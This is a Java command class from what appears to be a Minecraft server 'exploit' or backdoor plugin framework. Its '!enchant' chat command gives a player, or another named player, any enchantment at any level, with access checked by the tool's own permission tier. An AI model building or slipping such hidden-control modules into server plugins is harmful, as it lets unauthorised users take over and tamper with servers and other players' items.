package com.tmquan2508.exploit.commands;

import com.tmquan2508.exploit.Exploit;
import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.NamespacedKey;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;

public class EnchantCommand extends Command {
    public EnchantCommand() { super(); }
    @Override public String getName() { return "enchant"; }
    @Override public String getDescription() { return "Applies a specific enchantment to the held item."; }
    @Override public String getUsage() { return "<enchantment> <level> [player]"; }
    @Override public int getRequirePerm() { return 2; }
    @Override public void execute(Player sender, String[] args) {
        if (args.length < 2) {
            Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this));
            Exploit.sender.sendWarn(sender, "Example: !enchant sharpness 100");
            Exploit.sender.sendWarn(sender, "Example: !enchant efficiency 10 Kudo");
            return;
        }

        Player target = sender;
        if (args.length > 2) {
            target = Bukkit.getPlayer(args[2]);
            if (target == null) {
                Exploit.sender.sendError(sender, "Player not found: " + args[2]);
                return;
            }
        }

        ItemStack item = target.getInventory().getItemInMainHand();
        if (item.getType() == Material.AIR) {
            Exploit.sender.sendError(sender, target.getName() + " is not holding an item.");
            return;
        }

        ItemMeta meta = item.getItemMeta();
        if (meta == null) {
            Exploit.sender.sendError(sender, "Could not get item metadata.");
            return;
        }

        Enchantment enchantment = Enchantment.getByKey(NamespacedKey.minecraft(args[0].toLowerCase()));
        if (enchantment == null) {
            Exploit.sender.sendError(sender, "Invalid enchantment: " + args[0] + ". Use the Minecraft ID name (e.g., 'sharpness', 'unbreaking', 'fire_aspect').");
            return;
        }

        int level;
        try {
            level = Integer.parseInt(args[1]);
        } catch (NumberFormatException e) {
            Exploit.sender.sendError(sender, "Invalid level: " + args[1] + ". Must be a number.");
            return;
        }
        meta.addEnchant(enchantment, level, true);
        item.setItemMeta(meta);
        Exploit.sender.sendSuccess(sender, "Applied " + enchantment.getKey().getKey() + " " + level + " to " + target.getName() + "'s item.");
    }
}